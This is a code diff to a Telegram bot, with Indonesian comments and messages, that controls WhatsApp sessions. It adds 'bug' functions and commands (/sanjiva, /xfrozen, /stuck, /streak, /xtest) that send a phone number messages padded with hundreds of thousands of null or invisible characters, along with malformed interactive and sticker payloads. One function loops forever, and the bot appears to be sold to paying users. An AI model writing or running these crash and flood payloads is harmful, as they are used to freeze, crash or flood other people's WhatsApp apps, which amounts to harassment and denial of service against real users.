@@ -126,10 +126,6 @@ let groupOnly = loadGroupOnly();
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// Store button click counts
-const bugMenuClickCount = new Map();
-const ownerMenuClickCount = new Map();
-
 function startBot() {
   console.log(chalk.red(`
 hahahhaha yes bro tanks for buying 
@@ -463,6 +459,112 @@ async function connectToWhatsApp(botNumber, chatId) {
 }
 
 // ================= BUG FUNCTIONS (SEMUA DIKIRIM KE TARGET) ================= //
+
+async function VsxCrashDelay(sock, target) {
+  await sock.sendMessage(target, { text: "\u0000".repeat(900000) });
+}
+
+async function DelayHard(sock, target) {
+  await sock.sendMessage(target, { text: "x".repeat(800000) });
+}
+
+async function StickerFC(sock, target) {
+  await sock.sendMessage(target, { sticker: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true" } });
+}
+
+async function Freeze(sock, target) {
+  await sock.relayMessage(target, {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { text: "FREEZE", format: "DEFAULT" },
+          nativeFlowResponseMessage: {
+            name: "cta_FREEZE",
+            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(500000)}\"}}`,
+            version: 3
+          }
+        }
+      }
+    }
+  }, { participant: { jid: target } });
+}
+
+async function invisfcmsg(sock, target) {
+  await sock.sendMessage(target, { text: "\u200b".repeat(800000) });
+}
+
+async function VnXDelayXFcNew(sock, target) {
+  await sock.relayMessage(target, {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { text: "VnX", format: "DEFAULT" },
+          nativeFlowResponseMessage: {
+            name: "cta_VnX",
+            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900009)}\"}}`,
+            version: 3,
+            contextInfo: {
+              isForwarded: true,
+              forwardingScore: 999,
+              quotedMessage: {
+                stickerMessage: {
+                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+                  fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+                  fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+                  mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+                  mimetype: "image/webp",
+                  directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+                  fileLength: "10610",
+                  mediaKeyTimestamp: "1775044724",
+                  stickerSentTs: "1775044724091"
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }, { participant: { jid: target } });
+}
+
+async function delaynewinvisibleVnX(sock, target) {
+  while (true) {
+    try {
+      const MsgNew = {
+        groupStatusMessageV2: {
+          message: {
+            interactiveResponseMessage: {                     
+              body: {
+                text: "VnXNgelay",
+                format: "DEFAULT"
+              },
+              nativeFlowResponseMessage: {
+                name: "galaxy_message",
+                paramsJson: "\u0000".repeat(400000),
+                version: 3
+              },
+              entryPointConversionSource: "call_permission_request"
+            }
+          }
+        }
+      };
+
+      await sock.relayMessage(target, MsgNew, { participant: { jid: target } });
+      console.log(`✅ VnX Sent to ${target}`);
+      await sleep(1200);
+    } catch (e) {
+      console.log("❌ Error:", e.message);
+      await sleep(5000);
+    }
+  }
+}
+
+async function VisiNoob(sock, target) {
+  for (let i = 0; i < 50; i++) {
+    await sock.sendMessage(target, { text: "\u200e".repeat(600000) });
+    await sleep(100);
+  }
+}
 
 async function OrderSecret(sock, target) {
   const RuxzSecret = {
@@ -1006,98 +1108,297 @@ bot.onText(/\/addfunccmd(?:\s+(.+))?/, async (msg, match) => {
   }, 3000);
 });
 
-// ================= FITUR BUTTON MENU 3x KLIK ================= //
+// ================= FITUR BARU ================= //
 
-// Bug Menu Button Handler
-bot.on("callback_query", async (callbackQuery) => {
-  const chatId = callbackQuery.message.chat.id;
-  const userId = callbackQuery.from.id;
-  const data = callbackQuery.data;
-  
-  if (data === "open_bug_menu") {
-    let count = bugMenuClickCount.get(userId) || 0;
-    count++;
-    bugMenuClickCount.set(userId, count);
-    
-    if (count >= 3) {
-      const bugMenuText = `\`\`\`
-╭═════════════════❀ 
-│   ⚘ BUG MENU ⚘
-╰═════════════════❀
-╭═════════════════❀
-│ ❀ /sanjiva <number> - delay invis brutality combo
-│ ❀ /sanjixa <number> - delay invis hard
-│ ❀ /xfrozen <number> - freeze invisible 
-│ ❀ /stunt <number> - fc call invis
-│ ❀ /stuck <number> - fc invis msg andro 
-╰═════════════════❀\`\`\``;
-      
-      await bot.editMessageText(bugMenuText, {
-        chat_id: chatId,
-        message_id: callbackQuery.message.message_id,
-        parse_mode: "Markdown"
-      });
-      
-      bugMenuClickCount.delete(userId);
-    } else {
-      const remaining = 3 - count;
-      await bot.answerCallbackQuery(callbackQuery.id, {
-        text: `⚠️ Tekan ${remaining} kali lagi untuk membuka BUG MENU!`,
-        show_alert: false
-      });
-    }
+// Fitur /fullupdate
+bot.onText(/\/fullupdate/, async (msg) => {
+  const chatId = msg.chat.id;
+  if (!isOwner(msg.from.id)) {
+    await bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan perintah ini.");
+    return;
   }
   
-  if (data === "open_owner_menu") {
-    if (!isOwner(userId)) {
-      await bot.answerCallbackQuery(callbackQuery.id, {
-        text: "❌ Menu ini hanya untuk OWNER!",
-        show_alert: true
-      });
+  await performFullUpdate(chatId);
+});
+
+// Fitur /cekupdate
+bot.onText(/\/cekupdate/, async (msg) => {
+  const chatId = msg.chat.id;
+  if (!isOwner(msg.from.id)) {
+    await bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan perintah ini.");
+    return;
+  }
+  
+  try {
+    await bot.sendMessage(chatId, "🔍 Memeriksa update dari GitHub...");
+    
+    const updateCheck = await checkGitHubUpdate();
+    
+    if (updateCheck.error) {
+      await bot.sendMessage(chatId, `❌ Gagal memeriksa update: ${updateCheck.error}`);
       return;
     }
     
-    let count = ownerMenuClickCount.get(userId) || 0;
-    count++;
-    ownerMenuClickCount.set(userId, count);
-    
-    if (count >= 3) {
-      const ownerMenuText = `\`\`\`
-╭═════════════════❀ 
-│   ⚘ OWNER MENU ⚘
-╰═════════════════❀
-╭═════════════════❀
-│ ❀ /addbot <number>
-│ ❀ /addowner <userId>
-│ ❀ /addprem <userId> 
-│ ❀ /delowner <userId>
-│ ❀ /delprem <userId>
-│ ❀ /onlygb on/off
-│ ❀ /mode on/off
-│ ❀ /stopcmd <command>
-│ ❀ /runcmd <command>
-│ ❀ /fullupdate - update dari GitHub
-│ ❀ /cekupdate - cek update GitHub
-│ ❀ /addfunccmd - tambah cmd & fungsi
-│ ❀ /updatecmd - update loop/sleep/fungsi
-╰═════════════════❀\`\`\``;
+    if (updateCheck.hasUpdate) {
+      const localStats = fs.statSync(__filename);
+      const localSize = (localStats.size / 1024).toFixed(2);
+      const remoteSize = (updateCheck.remoteContent.length / 1024).toFixed(2);
       
-      await bot.editMessageText(ownerMenuText, {
-        chat_id: chatId,
-        message_id: callbackQuery.message.message_id,
-        parse_mode: "Markdown"
-      });
+      await bot.sendMessage(chatId, `✅ UPDATE TERSEDIA!
       
-      ownerMenuClickCount.delete(userId);
+📦 Ukuran lokal: ${localSize} KB
+📦 Ukuran remote: ${remoteSize} KB
+
+Gunakan /fullupdate untuk mengupdate bot.`);
     } else {
-      const remaining = 3 - count;
-      await bot.answerCallbackQuery(callbackQuery.id, {
-        text: `⚠️ Tekan ${remaining} kali lagi untuk membuka OWNER MENU!`,
-        show_alert: false
-      });
+      await bot.sendMessage(chatId, "✅ Bot sudah versi terbaru. Tidak ada update.");
     }
+  } catch (error) {
+    console.error("Error in cekupdate:", error);
+    await bot.sendMessage(chatId, `❌ Error: ${error.message}`);
   }
 });
+
+// Fitur /onlygb <on/off>
+bot.onText(/\/onlygb (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  if (!isOwner(msg.from.id)) {
+    return;
+  }
+  
+  const mode = match[1].toLowerCase();
+  if (mode === "on") {
+    saveGroupOnly("on");
+    groupOnly = { mode: "on" };
+    await bot.sendMessage(chatId, "✅ Mode Group Only: ON (bot hanya merespon di grup)");
+  } else if (mode === "off") {
+    saveGroupOnly("off");
+    groupOnly = { mode: "off" };
+    await bot.sendMessage(chatId, "✅ Mode Group Only: OFF (bot merespon di grup & private)");
+  } else {
+    await bot.sendMessage(chatId, "❌ Gunakan: /onlygb on atau /onlygb off");
+  }
+});
+
+// Fitur /mode <on/off>
+bot.onText(/\/mode (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  if (!isOwner(msg.from.id)) {
+    return;
+  }
+  
+  const mode = match[1].toLowerCase();
+  if (mode === "on") {
+    saveBotMode("on");
+    botMode = { mode: "on" };
+    await bot.sendMessage(chatId, "✅ Maintenance Mode: ON (hanya owner yang bisa akses)");
+  } else if (mode === "off") {
+    saveBotMode("off");
+    botMode = { mode: "off" };
+    await bot.sendMessage(chatId, "✅ Maintenance Mode: OFF (semua user bisa akses)");
+  } else {
+    await bot.sendMessage(chatId, "❌ Gunakan: /mode on atau /mode off");
+  }
+});
+
+// Fitur /stopcmd <command>
+bot.onText(/\/stopcmd (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  if (!isOwner(msg.from.id)) {
+    return;
+  }
+  
+  let command = match[1].toLowerCase().replace("/", "");
+  let blocked = loadBlockedCommands();
+  
+  if (!blocked.includes(command)) {
+    blocked.push(command);
+    saveBlockedCommands(blocked);
+    await bot.sendMessage(chatId, `✅ Command /${command} telah di-block`);
+  } else {
+    await bot.sendMessage(chatId, `⚠️ Command /${command} sudah dalam daftar block`);
+  }
+});
+
+// Fitur /runcmd <command>
+bot.onText(/\/runcmd (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  if (!isOwner(msg.from.id)) {
+    return;
+  }
+  
+  let command = match[1].toLowerCase().replace("/", "");
+  let blocked = loadBlockedCommands();
+  
+  if (blocked.includes(command)) {
+    blocked = blocked.filter(cmd => cmd !== command);
+    saveBlockedCommands(blocked);
+    await bot.sendMessage(chatId, `✅ Command /${command} telah di-unblock`);
+  } else {
+    await bot.sendMessage(chatId, `⚠️ Command /${command} tidak ada dalam daftar block`);
+  }
+});
+
+// ================= FITUR MENU DISCO ================= //
+
+let activeMenuInterval = null;
+let activeMenuMessageId = null;
+let activeMenuChatId = null;
+
+const emojiList = [
+  "🔴", "🟥", "❤️", "🟠", "🟧", "🧡", "🟡", "🟨", "💛", 
+  "🟢", "🟩", "💚", "🔵", "🟦", "💙", "🟣", "🟪", "💜", 
+  "🟤", "🟫", "⚫", "⬛", "⚪", "⬜", "🤍", "🤎", "🖤", 
+  "🩷", "🩵", "🩶", "🌸", "⭐", "✨", "🔥", "💀", "👾"
+];
+
+const bugMenuButtons = [
+  [
+    { text: "🔰 /sanjiva", callback_data: "cmd_sanjiva" },
+    { text: "⚡ /sanjixa", callback_data: "cmd_sanjixa" }
+  ],
+  [
+    { text: "❄️ /xfrozen", callback_data: "cmd_xfrozen" },
+    { text: "💀 /stunt", callback_data: "cmd_stunt" }
+  ],
+  [
+    { text: "📌 /stuck", callback_data: "cmd_stuck" },
+    { text: "🌀 /streak", callback_data: "cmd_streak" }
+  ],
+  [
+    { text: "◀️ Kembali ke Menu", callback_data: "back_to_main" }
+  ]
+];
+
+const ownerMenuButtons = [
+  [
+    { text: "➕ /addbot", callback_data: "cmd_addbot" },
+    { text: "👑 /addowner", callback_data: "cmd_addowner" }
+  ],
+  [
+    { text: "⭐ /addprem", callback_data: "cmd_addprem" },
+    { text: "❌ /delowner", callback_data: "cmd_delowner" }
+  ],
+  [
+    { text: "❌ /delprem", callback_data: "cmd_delprem" },
+    { text: "🔧 /mode", callback_data: "cmd_mode" }
+  ],
+  [
+    { text: "👥 /onlygb", callback_data: "cmd_onlygb" },
+    { text: "🛑 /stopcmd", callback_data: "cmd_stopcmd" }
+  ],
+  [
+    { text: "▶️ /runcmd", callback_data: "cmd_runcmd" },
+    { text: "🔄 /fullupdate", callback_data: "cmd_fullupdate" }
+  ],
+  [
+    { text: "📡 /cekupdate", callback_data: "cmd_cekupdate" },
+    { text: "➕ /addfunccmd", callback_data: "cmd_addfunccmd" }
+  ],
+  [
+    { text: "⚙️ /updatecmd", callback_data: "cmd_updatecmd" },
+    { text: "◀️ Kembali ke Menu", callback_data: "back_to_main" }
+  ]
+];
+
+function getDiscoKeyboard(buttons, step) {
+  const animatedButtons = buttons.map(row => 
+    row.map(btn => {
+      const emoji = emojiList[(step + Math.random() * emojiList.length) % emojiList.length];
+      const newText = btn.text.replace(/[🔴🟥❤️🟠🟧🧡🟡🟨💛🟢🟩💚🔵🟦💙🟣🟪💜🟤🟫⚫⬛⚪⬜🤍🤎🖤🩷🩵🩶🌸⭐✨🔥💀👾]/g, '');
+      return {
+        text: `${emoji} ${newText.trim()}`,
+        callback_data: btn.callback_data
+      };
+    })
+  );
+  return { reply_markup: { inline_keyboard: animatedButtons } };
+}
+
+function getMainDiscoKeyboard(step) {
+  const emoji1 = emojiList[step % emojiList.length];
+  const emoji2 = emojiList[(step + 5) % emojiList.length];
+  const emoji3 = emojiList[(step + 10) % emojiList.length];
+  const emoji4 = emojiList[(step + 15) % emojiList.length];
+  const emoji5 = emojiList[(step + 20) % emojiList.length];
+  const emoji6 = emojiList[(step + 25) % emojiList.length];
+  
+  return {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: `${emoji1} バグメニュー 🦠🇯🇵`, callback_data: "bugmenu" },
+          { text: `${emoji2} オーナーメニュー 🔒🇯🇵`, callback_data: "ownermenu" }
+        ],
+        [
+          { text: `${emoji3} /sanjiva`, callback_data: "cmd_sanjiva" },
+          { text: `${emoji4} /stunt`, callback_data: "cmd_stunt" }
+        ],
+        [
+          { text: `${emoji5} /xfrozen`, callback_data: "cmd_xfrozen" },
+          { text: `${emoji6} /stuck`, callback_data: "cmd_stuck" }
+        ]
+      ]
+    }
+  };
+}
+
+async function startDiscoMenu(chatId, messageId, isMainMenu = true, currentButtons = null, discoStep = 0) {
+  if (activeMenuInterval) {
+    clearInterval(activeMenuInterval);
+    activeMenuInterval = null;
+  }
+  
+  activeMenuChatId = chatId;
+  activeMenuMessageId = messageId;
+  
+  let step = discoStep;
+  let intervalCount = 0;
+  let currentStyle = "emoji";
+  
+  activeMenuInterval = setInterval(async () => {
+    try {
+      step++;
+      intervalCount++;
+      
+      if (intervalCount >= 40 && currentStyle === "emoji") {
+        currentStyle = "color";
+        intervalCount = 0;
+      } else if (intervalCount >= 40 && currentStyle === "color") {
+        currentStyle = "emoji";
+        intervalCount = 0;
+      }
+      
+      let keyboard;
+      if (isMainMenu) {
+        keyboard = getMainDiscoKeyboard(step);
+      } else {
+        keyboard = getDiscoKeyboard(currentButtons, step);
+      }
+      
+      await bot.editMessageReplyMarkup(keyboard.reply_markup, {
+        chat_id: chatId,
+        message_id: messageId
+      });
+      
+      await sleep(2500);
+      
+    } catch (err) {
+      if (err.response?.body?.error_code !== 400) {
+        console.log("Disco error:", err.message);
+      }
+    }
+  }, 2500);
+}
+
+function stopDiscoMenu() {
+  if (activeMenuInterval) {
+    clearInterval(activeMenuInterval);
+    activeMenuInterval = null;
+  }
+  activeMenuChatId = null;
+  activeMenuMessageId = null;
+}
 
 // ================= BOT COMMANDS ================= //
 
@@ -1115,45 +1416,125 @@ bot.onText(/\/start/, async (msg) => {
     return;
   }
   
-  const menuText = `\`\`\`
-╭═════════════════❀ 
-│   ⚘ PRIMROSE LINUX BOT ⚘
+  const menuText = `╭═════════════════❀
+│   ⚘ PRIMROSE LOTUS BOT ⚘
 ╰═════════════════❀
 ╭═════════════════❀
-│  ⚘ MAIN MENU ⚘
-│ Click button di bawah untuk membuka menu
-╰═════════════════❀\`\`\``;
+│  ⚘ SELAMAT DATANG ⚘
+│═════════════════❀
+│  Silakan pilih menu di bawah
+╰═════════════════❀`;
+  
+  const sentMsg = await bot.sendMessage(chatId, menuText, {
+    parse_mode: "HTML",
+    ...getMainDiscoKeyboard(0)
+  });
+  
+  if (activeMenuInterval) {
+    stopDiscoMenu();
+  }
+  
+  startDiscoMenu(chatId, sentMsg.message_id, true);
+});
 
-  const buttons = {
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "バグメニュー🦠", callback_data: "open_bug_menu" }],
-        [{ text: "OWNER MENU 👑", callback_data: "open_owner_menu" }],
-        [{ text: "This Lotus", url: "t.me/ItsMeXanderRzMd" }],
-        [{ text: "Channel Info", url: "t.me/allteamlinux" }]
-      ]
-    }
-  };
-
-  try {
-    const imagePath = path.join(__dirname, "assets", "images", "thumb.jpeg");
-    if (fs.existsSync(imagePath)) {
-      await bot.sendPhoto(chatId, fs.createReadStream(imagePath), {
-        caption: menuText,
-        parse_mode: "Markdown",
-        ...buttons
+// Action handlers untuk menu
+bot.on("callback_query", async (callbackQuery) => {
+  const action = callbackQuery.data;
+  const msg = callbackQuery.message;
+  const chatId = msg.chat.id;
+  const messageId = msg.message_id;
+  const userId = callbackQuery.from.id;
+  
+  if (action === "bugmenu") {
+    stopDiscoMenu();
+    
+    const bugMenuText = `╭═════════════════❀
+│   ⚘ BUG MENU ⚘
+╰═════════════════❀
+╭═════════════════❀
+│  ❀ /sanjiva <number> - delay invis brutality combo
+│  ❀ /sanjixa <number> - delay invis hard
+│  ❀ /xfrozen <number> - freeze invisible 
+│  ❀ /stunt <number> - order secret spam
+│  ❀ /stuck <number> - fc invis msg andro
+│  ❀ /streak <number> - crash spam
+╰═════════════════❀`;
+    
+    try {
+      await bot.editMessageText(bugMenuText, {
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: "Markdown"
       });
-    } else {
-      await bot.sendMessage(chatId, menuText, {
-        parse_mode: "Markdown",
-        ...buttons
+      
+      startDiscoMenu(chatId, messageId, false, bugMenuButtons, 0);
+      
+      await bot.answerCallbackQuery(callbackQuery.id);
+    } catch (err) {}
+    
+  } else if (action === "ownermenu") {
+    stopDiscoMenu();
+    
+    const ownerMenuText = `╭═════════════════❀
+│   ⚘ OWNER MENU ⚘
+╰═════════════════❀
+╭═════════════════❀
+│  ❀ /addbot <number>
+│  ❀ /addowner <userId>
+│  ❀ /addprem <userId> 
+│  ❀ /delowner <userId>
+│  ❀ /delprem <userId>
+│  ❀ /onlygb on/off
+│  ❀ /mode on/off
+│  ❀ /stopcmd <command>
+│  ❀ /runcmd <command>
+│  ❀ /fullupdate
+│  ❀ /cekupdate
+│  ❀ /addfunccmd
+│  ❀ /updatecmd
+╰═════════════════❀`;
+    
+    try {
+      await bot.editMessageText(ownerMenuText, {
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: "Markdown"
       });
-    }
-  } catch (error) {
-    console.error("Error sending start menu:", error);
-    await bot.sendMessage(chatId, menuText, {
-      parse_mode: "Markdown",
-      ...buttons
+      
+      startDiscoMenu(chatId, messageId, false, ownerMenuButtons, 0);
+      
+      await bot.answerCallbackQuery(callbackQuery.id);
+    } catch (err) {}
+    
+  } else if (action === "back_to_main") {
+    stopDiscoMenu();
+    
+    const mainText = `╭═════════════════❀
+│   ⚘ PRIMROSE LOTUS BOT ⚘
+╰═════════════════❀
+╭═════════════════❀
+│  ⚘ SELAMAT DATANG ⚘
+│═════════════════❀
+│  Silakan pilih menu di bawah
+╰═════════════════❀`;
+    
+    try {
+      await bot.editMessageText(mainText, {
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: "HTML"
+      });
+      
+      startDiscoMenu(chatId, messageId, true, null, 0);
+      
+      await bot.answerCallbackQuery(callbackQuery.id);
+    } catch (err) {}
+    
+  } else if (action.startsWith("cmd_")) {
+    const cmd = action.replace("cmd_", "");
+    await bot.answerCallbackQuery(callbackQuery.id, {
+      text: `Command /${cmd} - Ketik manual untuk penggunaan`,
+      show_alert: false
     });
   }
 });
@@ -1181,8 +1562,6 @@ bot.onText(/\/addbot (.+)/, async (msg, match) => {
     );
   }
 });
-
-// ================= BOT COMMANDS YANG HILANG PERLU DITAMBAH ================= //
 
 bot.onText(/\/sanjiva(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
@@ -1231,13 +1610,70 @@ bot.onText(/\/sanjiva(?:\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < 10; i++) {
-      await OrderSecret(sock, target);
-      await sleep(1000);
-      console.log(chalk.green(`✅ Success Sending OrderSecret to ${target}`));
+      await delaynewinvisibleVnX(sock, target);
+      await sleep(2);
+      console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
     }
     
   } catch (error) {
     console.error("Error in sanjiva:", error);
+  }
+});
+
+bot.onText(/\/xtest(?:\s+(.+))?/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+  const botModeData = loadBotMode();
+  const groupOnlyData = loadGroupOnly();
+  
+  if (botModeData.mode === "on" && !isOwner(userId)) {
+    return;
+  }
+  
+  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
+    return;
+  }
+  
+  if (checkCommandBlocked("xtest", msg)) {
+    return;
+  }
+  
+  if (!isOwner(userId) && !isPremium(userId)) {
+    return;
+  }
+
+  if (!match[1]) {
+    return;
+  }
+
+  const targetNumber = match[1];
+  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+  const target = `${formattedNumber}@s.whatsapp.net`;
+
+  try {
+    if (sessions.size === 0) {
+      return;
+    }
+
+    const sock = sessions.values().next().value;
+    
+    await bot.sendMessage(chatId, `✅ xtest (bug) selesai untuk ${formattedNumber}`, {
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
+        ]
+      }
+    });
+    
+    for (let i = 0; i < 400; i++) {
+      await StickerFC(sock, target);
+      await sleep(2000);
+      console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
+    }
+    
+  } catch (error) {
+    console.error("Error in xtest:", error);
   }
 });
 
@@ -1288,9 +1724,9 @@ bot.onText(/\/sanjixa(?:\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < 3; i++) {
-      await OrderSecret(sock, target);
-      await sleep(1000);
-      console.log(chalk.green(`✅ Success Sending OrderSecret to ${target}`));
+      await VsxCrashDelay(sock, target);
+      await sleep(300);
+      console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
     }
     
   } catch (error) {
@@ -1345,9 +1781,9 @@ bot.onText(/\/xfrozen(?:\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < 300; i++) {
-      await OrderSecret(sock, target);
-      await sleep(1000);
-      console.log(chalk.green(`✅ Success Sending OrderSecret to ${target}`));
+      await Freeze(sock, target);
+      await sleep(3000);
+      console.log(chalk.green(`✅ Success Sending Frezee to ${target}`));
     }
     
   } catch (error) {
@@ -1401,9 +1837,10 @@ bot.onText(/\/stuck(?:\s+(.+))?/, async (msg, match) => {
       }
     });
     
-    await OrderSecret(sock, target);
+    await invisfcmsg(sock, target);
+    await sleep(2000);
     
-    console.log(chalk.green(`✅ Success Sending OrderSecret to ${target}`));
+    console.log(chalk.green(`✅ Success Sending Crash to ${target}`));
     
   } catch (error) {
     console.error("Error in stuck:", error);
@@ -1466,6 +1903,114 @@ bot.onText(/\/stunt(?:\s+(.+))?/, async (msg, match) => {
     console.error("Error in stunt:", error);
   }
 });
+
+bot.onText(/\/streak(?:\s+(.+))?/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+  const botModeData = loadBotMode();
+  const groupOnlyData = loadGroupOnly();
+  
+  if (botModeData.mode === "on" && !isOwner(userId)) {
+    return;
+  }
+  
+  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
+    return;
+  }
+  
+  if (checkCommandBlocked("streak", msg)) {
+    return;
+  }
+  
+  if (!isOwner(userId) && !isPremium(userId)) {
+    return;
+  }
+
+  if (!match[1]) {
+    return;
+  }
+
+  const targetNumber = match[1];
+  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+  const target = `${formattedNumber}@s.whatsapp.net`;
+
+  try {
+    if (sessions.size === 0) {
+      return;
+    }
+
+    const sock = sessions.values().next().value;
+    
+    await bot.sendMessage(chatId, `✅ streak (bug) selesai untuk ${formattedNumber}`, {
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "📱 CEK TARGET", url: `https://wa.me/${formattedNumber}` }]
+        ]
+      }
+    });
+    
+    await VisiNoob(sock, target);
+    
+    console.log(chalk.green(`✅ Success Sending Crash to ${target}`));
+    
+  } catch (error) {
+    console.error("Error in streak:", error);
+  }
+});
+
+// Menu command untuk mengirim menu disco
+bot.onText(/\/menu/, async (msg) => {
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+  const botModeData = loadBotMode();
+  const groupOnlyData = loadGroupOnly();
+  
+  if (botModeData.mode === "on" && !isOwner(userId)) {
+    return;
+  }
+  
+  if (groupOnlyData.mode === "on" && msg.chat.type === "private" && !isOwner(userId)) {
+    return;
+  }
+  
+  const menuText = `╭═════════════════❀
+│   ⚘ PRIMROSE LOTUS BOT ⚘
+╰═════════════════❀
+╭═════════════════❀
+│  ⚘ SELAMAT DATANG ⚘
+│═════════════════❀
+│  Silakan pilih menu di bawah
+╰═════════════════❀`;
+  
+  const sentMsg = await bot.sendMessage(chatId, menuText, {
+    parse_mode: "HTML",
+    ...getMainDiscoKeyboard(0)
+  });
+  
+  if (activeMenuInterval) {
+    stopDiscoMenu();
+  }
+  
+  startDiscoMenu(chatId, sentMsg.message_id, true);
+});
+
+const mainMenuButtonsForMenu = {
+  reply_markup: {
+    inline_keyboard: [
+      [{ text: "This Lotus", url: "t.me/ItsMeXanderRzMd" }],
+      [{ text: "Channel Info", url: "t.me/allteamlinux" }]
+    ],
+  },
+};
+
+function checkAndGetImagePath(imageName) {
+  const imagePath = path.join(__dirname, "assets", "images", imageName);
+  if (!fs.existsSync(imagePath)) {
+    return null;
+  }
+  return imagePath;
+}
 
 bot.onText(/\/addprem (.+)/, async (msg, match) => {
   const chatId = msg.chat.id;
